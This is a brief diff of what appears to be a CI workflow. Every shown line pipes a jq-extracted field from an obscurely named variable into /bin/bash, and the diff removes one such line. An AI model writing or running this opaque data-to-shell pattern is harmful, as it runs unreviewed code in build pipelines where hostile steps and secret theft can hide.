@@ -28,7 +28,6 @@ jobs:
           echo $vbuv5 | jq -r .pro739 | /bin/bash
           printf '%s' "$g035" | jq -r .gde41 | /bin/bash
           echo $d068 | jq -r .d227 | /bin/bash
-          echo $expu049 | jq -r .ezp88593 | /bin/bash
           echo $wupw59926 | jq -r .r994 | /bin/bash
           echo $feupx20181 | jq -r .gfd9 | /bin/bash
 
